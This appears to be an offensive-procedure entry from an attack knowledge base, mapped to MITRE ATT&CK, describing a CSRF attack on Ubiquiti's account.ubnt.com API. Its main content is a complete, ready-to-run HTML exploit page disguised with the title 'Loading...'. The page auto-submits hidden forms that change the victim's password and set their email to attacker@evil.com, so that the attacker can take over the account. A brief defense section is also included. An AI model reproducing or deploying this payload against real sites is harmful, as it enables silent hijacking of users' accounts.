---
tags:
  - csrf
  - web
  - html
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:30.075Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 3e875bcc-3412-4741-a03d-096180dda99f
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-Malicious-CSRF-Webpage

## Summary

This procedure involves crafting an HTML webpage that exploits a CSRF vulnerability in a Django RESTful API by automatically submitting forged POST requests to change user credentials without CSRF token validation.

## Description

In the context of the Ubiquiti account.ubnt.com vulnerability, the attacker creates a simple HTML file with an auto-submitting form targeting API endpoints for password changes and user information updates. When loaded in a browser where the victim is authenticated, it performs state-changing actions cross-origin without the site's CSRF protections, leading to account compromise. This requires no advanced tools, just basic web development knowledge, and assumes the target API lacks CSRF middleware.

## Requirements

1. Knowledge of the target API endpoints (e.g., password change and user update URLs on account.ubnt.com)
2. Victim's active authenticated session in the browser
3. Basic HTML and JavaScript skills for form creation

## Defense

Defensive measures and detection strategies:

- Enable CSRF tokens in Django views using `@csrf_protect` decorator or global middleware
- Implement SameSite=Strict cookies to prevent cross-site requests
- Monitor for anomalous password change requests from unusual referers

## Objectives

1. Forge unauthorized POST requests to sensitive API endpoints
2. Alter victim account details (password, email, name) silently
3. Prepare for subsequent account access and takeover

## Instructions

### Step 1: Identify Target Endpoints

**Context**: Determine the exact API URLs vulnerable to CSRF, such as those handling POST requests for user modifications without token checks.

Inspect the site's network traffic or documentation to confirm endpoints like `/api/v1/change-password/` and `/api/v1/update-profile/`.

### Step 2: Craft the HTML Form

**Context**: Build an HTML structure that auto-submits the form using JavaScript, mimicking legitimate requests.

Create `exploit_csrf_poc.html` with content like:

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <form id="csrf-form" action="https://account.ubnt.com/api/v1/change-password/" method="POST" style="display:none;">
        <input type="hidden" name="new_password" value="attacker_new_pass123">
        <input type="hidden" name="confirm_password" value="attacker_new_pass123">
    </form>
    <form id="profile-form" action="https://account.ubnt.com/api/v1/update-profile/" method="POST" style="display:none;">
        <input type="hidden" name="email" value="attacker@evil.com">
        <input type="hidden" name="name" value="Hacked User">
    </form>
    <script>
        document.getElementById('csrf-form').submit();
        setTimeout(() => document.getElementById('profile-form').submit(), 1000);
    </script>
</body>
</html>
```

> This script submits the forms immediately upon page load, forging the requests using the victim's cookies.

### Step 3: Test the Exploit Locally

**Context**: Verify the HTML works by loading it in a browser logged into the target site.

Open the file in a browser with an active session; check network tab for successful POST submissions and account changes.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[web-exploitation]]
